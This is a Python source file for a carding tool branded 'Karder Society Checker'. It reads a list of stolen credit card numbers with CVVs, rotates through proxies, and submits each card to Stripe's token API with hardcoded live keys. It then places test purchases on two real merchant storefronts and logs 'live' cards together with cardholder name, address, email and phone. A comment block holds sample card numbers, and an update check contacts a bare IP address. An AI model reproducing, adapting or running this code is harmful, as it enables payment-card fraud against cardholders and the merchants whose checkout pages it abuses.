# -*- coding: utf-8 -*-
from bs4 import BeautifulSoup
from itertools import cycle
import requests
import json
import threading
import colorama
import os
import random
import time


colorama.init()
reset = '\033[0m'
fg = [
    '\033[1;91m',  # RED
    '\033[1;92m',  # GREEN
    '\033[1;93m',  # YELLOW
    '\033[1;94m',  # BLUE
    '\033[1;95m',  # MAGENTA
    '\033[1;96m',  # CYAN
    '\033[1;97m',  # WHITE
]

'''  ┌───────[ 4447962400608711|06|2021|272 ]──(52)
     └────────── DEAD >>> Reason: Your card's security code is incorrect.
┌───────[ 4447962400608109|06|2021|517 ]──(55)
└────────── DEAD >>> Reason: Your card's security code is incorrect.

┌───────[ 4447962400604579|06|2021|063 ]──(101)
└────────── DEAD >>> Reason: Your card's security code is incorrect.
     '''


class StripeChecker():

    def __init__(self):
        self.gateway1Purchase = "https://closedlooplabs.com/purchase"
        self.stripe_tokens = "https://api.stripe.com/v1/tokens"

        print("\n\n  {}------=[ {}KARDER SOCIETY CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
        print("      {}--= {}Created by KarderSociety {}=--          ".format(fg[0], fg[1], fg[0]))
        print("  {}------============================------\n".format(fg[0]))

        if not os.path.exists('live_cc.txt'):
            with open('live_cc.txt', 'w+') as lives:
                lives.write('--- LIVE CC ---\n')
                lives.close()
        else:
            pass

        if not os.path.exists('incorrect_cvv.txt'):
            with open('incorrect_cvv.txt', 'w+') as lives:
                lives.write('--- LIVE BUT INCORRECT CVV ---\n')
                lives.close()
        else:
            pass

        if not os.path.exists('cc.txt'):
            print("[-] Seems 'cc.txt' is not exists, create a new one first and place all the cc on it.")
            print(" └─> CreditNumber|Month|Year|CVV")
            exit(1)

        if not os.path.exists('proxies.txt'):
            print("[-] Seems 'proxies.txt' is not exists, create a new one first.")
            print(" └─> Don't input proxy if you not use!")
        print(colorama.Fore.RESET)
        options = ['1', '2', '0']
        up = input('[?] Check for update?[y/n] ')

        if 'y' in up.lower():
            print(colorama.Fore.YELLOW + "[*] Checking For Updates....")
            try:
                requests.get("http://52.211.14.150")
                print(colorama.Fore.GREEN + "[+] Update Found!, Run the updater.py to update the checker")
            except Exception:
                print(colorama.Fore.BLUE  + "[-] No Updates Available.")
        else:
            pass

        print(colorama.Fore.RESET)
        time.sleep(0.6)
        while True:
            print("                   [SELECT OPTIONS]")
            print("┃          [1]    =   Gateway 1                 ┃")
            print("┃          [2]    =   Gateway 1 (High Bal)      ┃ ")
            print("")
            try:
                option = str(input(colorama.Fore.LIGHTRED_EX + '[kschecker] >>> ' + colorama.Fore.RESET))
            except KeyboardInterrupt:
                break   

            if option not in options:
                print('[-] Invalid Gateway')

            elif option == "1":
                self.gateway1()

            elif option == "2":
                self.gateway1_HighBalance()

            else:
                pass

    def gateway1(self):

        proxy_lists = []
        cc_list = open('cc.txt', 'r').read()
        cc_list = cc_list.split('\n')
        credit_entry = 0
        # threads = []

        with open('proxies.txt', 'r') as proxy_list:
            proxy = proxy_list.read()
            proxy = proxy.split('\n')
            for x in proxy:
                proxy_lists.append(x)

        proxy_pool = cycle(proxy_lists)
        Username = str(input(fg[2] + '[*]' + reset + ' Enter Full Name: '))
        zipcode = str(input(fg[2] + '[*]' + reset + "Enter CC's ZipCode: "))
        email = str(input(fg[2] + '[*]' + reset + "Enter Email: "))
        # Username = "John Dalisay"
        # zipcode = "3100"
        proxyused = str(input(fg[5] + '[?]' + reset + ' Use Proxy?[y/n]: '))
        isproxyused = False

        if proxyused.lower() == "y":
            isAuth = str(input(fg[5] + "[?]" + reset + " Proxy is Authenticated?[y/n] "))
        else:
            isAuth = 'n'

        auth = False

        if isAuth.lower() == "y":
            auth = True
            username = str(input(fg[2] + '[*]' + reset + ' Username: '))
            password = str(input(fg[2] + '[*]' + reset + ' Password: '))
        else:
            username = ""
            password = ""

        print(fg[3] + "[*]" + reset + " Start Checking of " + str(len(cc_list)) + " Credit Card.")
        print()
        for credit_card in cc_list:
            session = requests.Session()
            credit_entry += 1
            if isproxyused:
                proxy_to_use = next(proxy_pool)

            # session, Username, credit_card, credit_entry,
            # proxy, username, password, isAuth=False

            try:
                ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
            except ValueError:
                pass

            if isproxyused:
                if isAuth:
                    proxy = {'https': "http://" + username + ':' + password + '@' + proxy}
                else:
                    proxy = {'https': 'http://' + proxy}
            else:
                proxy = {'': ''}


            checkout_data = {
                'email': email,
                'validation_type': 'card',
                'payment_user_agent': 'Stripe Checkout v3 checkout-manhattan (stripe.js/303cf2d)',
                'referrer': 'https://closedlooplabs.com/purchase',
                'pasted_fields': 'number',
                'card[number]': ccNum,
                'card[exp_month]': ccMonth,
                'card[exp_year]': ccYear,
                'card[cvc]': ccCode,
                'card[name]': Username,
                'card[address_zip]': 'zipcode',
                'time_on_page': random.randint(10000, 100000),
                'guid': '7745e9e2-dd6a-4714-8611-2b58a9058a31',
                'muid': '87094644-e1c0-4d6c-a12b-366cadfcac5b',
                'sid': 'ab5272e9-ebc6-4d8e-bf19-8935474e3b24',
                'key': 'pk_live_rNZDiQC7uiGPhITHRODSIkOw'
            }

            checkout_response = json.loads(session.post(self.stripe_tokens, proxies=proxy, data=checkout_data).text)
            try:
                error = checkout_response['error']
                print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                print(fg[0] + "└────────── " + reset + "DEAD >>> Reason: " + error['message'] + ' / FRAUD DETECTED')
                continue
            except KeyError:
                tok_id = checkout_response['id']

            result_data = {
                "stripeToken": tok_id,
                "stripeTokenType": "card",
                "stripeEmail": email
            }
            result_response = session.post(self.gateway1Purchase, proxies=proxy, data=result_data).text
            print()
            result = BeautifulSoup(result_response, 'html.parser')
            if result.find('title').get_text() == "Noise Blocker: Order Error":
                error = result.find('h3').get_text()

                if "Your card's security code is incorrect." in error:

                    print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                    print(fg[1] + "└────────── LIVE! ~> But Incorrect CVV (Good on Amazon)")

                    with open('incorrect_cvv.txt', 'a') as lives:
                        lives.write('FullName: ' + Username + '\tZipCode: ' + zipcode + '\tEmail: ' + email +'\tCredit Card: ' +credit_card + '\n------------------------------' + '\n')
                        lives.close()

                else:

                    print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                    print(fg[0] + "└────────── " + reset + "DEAD >>> Reason: " + str(error).replace('\n', '').replace('\t', ''))

            else:

                print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
                print(fg[1] + "└────────── LIVE!")

                with open('live_cc.txt', 'a') as lives:

                    lives.write('FullName: ' + Username + '\tZipCode: ' + zipcode + '\tEmail: ' + email +'\tCredit Card: ' +credit_card + '\n------------------------------' + '\n')
                    lives.close()

                pass

        print()
        print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
        print()
        input('PRESS ANY KEY TO EXIT GATEWAY 1')
        print()

    def gateway1_HighBalance(self):

        proxy_lists = []
        cc_list = open('cc.txt', 'r').read()
        cc_list = cc_list.split('\n')
        credit_entry = 0
        # threads = []

        with open('proxies.txt', 'r') as proxy_list:
            proxy = proxy_list.read()
            proxy = proxy.split('\n')
            for x in proxy:
                proxy_lists.append(x)

        proxy_pool = cycle(proxy_lists)
        fname = str(input(fg[2] + '[*]' + reset + ' Enter First Name: '))
        lname = str(input(fg[2] + '[*] ' + reset + "Enter Last Name: "))
        street = str(input(fg[2] + '[*] ' + reset + "Enter Street: "))
        city = str(input(fg[2] + '[*] ' + reset + "Enter City: "))
        state = str(input(fg[2] + '[*] ' + reset + "Enter State: "))
        zipcode = str(input(fg[2] + '[*] ' + reset + "Enter Zipcode: "))
        country = str(input(fg[2] + '[*] ' + reset + "Enter Country: "))
        email = str(input(fg[2] + '[*] ' + reset + "Enter Email: "))
        phone = str(input(fg[2] + '[*] ' + reset + "Enter Phone: "))
        l_email = email
        l_contact = fname + ' ' + lname
        lcompany = "Karder Society"
        proxyused = str(input(fg[5] + '[?]' + reset + ' Use Proxy?[y/n] '))
        isproxyused = False

        if proxyused.lower() == "y":
            isAuth = str(input(fg[5] + "[?]" + reset + " Proxy is Authenticated?[y/n] "))
        else:
            isAuth = 'n'

        auth = False

        if isAuth.lower() == "y":
            auth = True
            username = str(input(fg[2] + '[*]' + reset + ' Username: '))
            password = str(input(fg[2] + '[*]' + reset + ' Password: '))
        else:
            username = ""
            password = ""

        print(fg[3] + "[*]" + reset + " Start Checking of " + str(len(cc_list)) + " Credit Card.")
        print()
        for credit_card in cc_list:
            session = requests.Session()
            credit_entry += 1

            if isproxyused:
                proxy_to_use = next(proxy_pool)

            try:
                ccNum, ccMonth, ccYear, cvv = credit_card.split('|')
            except ValueError:
                pass

            if isproxyused:
                if isAuth:
                    proxy = {'https': "http://" + username + ':' + password + '@' + proxy}
                else:
                    proxy = {'https': 'http://' + proxy}
            else:
                proxy = {'': ''}

            firstData = {
                'wproancu': '1',
                'submit-annual': 'Buy Now',
                'wingpro3': '',
                'wpro5pak': '',
                'wpr10pak': '',
                'page': 'store/checkout',
                'preload': '1',
                }
            first = session.post('https://wingware.com/store/checkout', data=firstData, proxies=proxy)

            secondData = {
                "page": "store/customer",
                "submit": "Check out >>"
            }
            second = session.post('https://wingware.com/store/customer', data=secondData, proxies=proxy)

            thirdData = {
                'bill_fname': fname,
                'bill_mname': '',
                'bill_lname': lname,
                'bill_company': '',
                'bill_addr1': street,
                'bill_addr2': '',
                'bill_city': city,
                'bill_state': state,
                'bill_zip': zipcode,
                'bill_country': country,
                'bill_email': email,
                'bill_phone': phone,
                'bill_fax': '',
                'license_email': email,
                'license_contact': '',
                'license_company': '',
                'page': 'store/customer',
                'customer_form': '1',
                'submit': 'Payment Options >>',
            }
            third = session.post("https://wingware.com/store/customer", data=thirdData, proxies=proxy)

            fourthData = {
                'po_number': '',
                'METHOD': 'CC',
                'why_wingpro': '',
                'page': 'store/payment',
                'payment_form': '1',
                'submit': 'Continue >>'
            }
            fourth = session.post("https://wingware.com/store/payment", data=fourthData, proxies=proxy)

            parser = BeautifulSoup(fourth.text, 'html.parser')
            USER1 = parser.find('input', {'name': 'USER1'})['value']
            USER2 = parser.find('input', {'name': 'USER2'})['value']
            USER3 = parser.find('input', {'name': 'USER3'})['value']
            USER4 = parser.find('input', {'name': 'USER4'})['value']
            USER5 = parser.find('input', {'name': 'USER5'})['value']
            USER6 = parser.find('input', {'name': 'USER6'})['value']
            CUSTID = parser.find('input', {'name': 'CUSTID'})['value']

            stripe_data = {
                'email': email,
                'validation_type': "card",
                'payment_user_agent': "Stripe Checkout v3 checkout-manhattan (stripe.js/303cf2d)",
                'referrer': "https://wingware.com/store/payment",
                'pasted_fields': 'number',
                'card[number]': ccNum,
                'card[exp_month]': ccMonth,
                'card[exp_year]': ccYear,
                'card[cvc]': cvv,
                'card[name]': fname + ' ' + lname,
                'time_on_page': '34893',
                'guid': '7745e9e2-dd6a-4714-8611-2b58a9058a31',
                'muid': '87094644-e1c0-4d6c-a12b-366cadfcac5b',
                'sid': '58aa2a75-dc62-4cac-8bc6-fb591cc05520',
                'key': 'pk_live_auPeFpVz8GapL59rRih8hhI8'
            }
            stripe_response = json.loads(session.post(self.stripe_tokens, proxies=proxy, data=stripe_data).text)

            try:
                error = stripe_response['error']
                print(colorama.Fore.RED + "DEAD    ---[" + str(credit_entry) + "]---    " + credit_card + "\tReason: " + error['message'] + ' / DETECTED AS FRAUD!')
                continue
            except KeyError:
                tok_id = stripe_response['id']

            results = {
                'USER1': USER1,
                'USER2': USER2,
                'USER3': USER3,
                'USER4': USER4,
                'USER5': USER5,
                'USER6': USER6,
                'AMOUNT': '179.0',
                'METHOD': 'CC',
                'CUSTID': CUSTID,
                'stripeToken': tok_id,
                'stripeTokenType': 'card',
                'stripeEmail': email,
            }
            result = session.post('https://wingware.com/store/fulfillment', proxies=proxy, data=results).text
            parser2 = BeautifulSoup(result, 'html.parser')

            if 'Payment Failed - Wing Python IDE' in parser2.find('title').get_text():
                msg = parser2.findAll('b')[2]
                if "Your card's security code is incorrect." in msg.next_sibling:
                    print(colorama.Fore.GREEN + "LIVE    ---[" + str(credit_entry) + "]---    " + credit_card + "\tReason: " + msg.next_sibling)

                    with open('incorrect_cvv.txt', 'a') as lives:
                        formatter = """
------------- INCORRECT CVV -------------
Fullname: {}
Street: {}
City: {}
State: {}
Zipcode: {}
Country: {}
Email: {}
Phone: {}
CreditCard: {}
-----------------------------------------""".format(fname + lname, street, city, state, zipcode, country, email, phone, credit_card)
                        lives.write(formatter)
                        lives.close()

                else:
                    print(colorama.Fore.RED + "DEAD    ---[" + str(credit_entry) + "]---    " + credit_card + "\tReason: " + msg.next_sibling)
            else:
                with open('incorrect_cvv.txt', 'a') as lives:
                    formatter = """
------------- LIVE CC -------------
Fullname: {}
Street: {}
City: {}
State: {}
Zipcode: {}
Country: {}
Email: {}
Phone: {}
CreditCard: {}
-----------------------------------""".format(fname + lname, street, city, state, zipcode, country, email, phone, credit_card)
                    lives.write(formatter)
                    lives.close()

                print(colorama.Fore.GREEN + "LIVE    ---[" + str(credit_entry) + "]---    " + credit_card)
        print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
        input("PRESS ANY KEY TO EXIT GATEWAY 2")
        print()

StripeChecker()
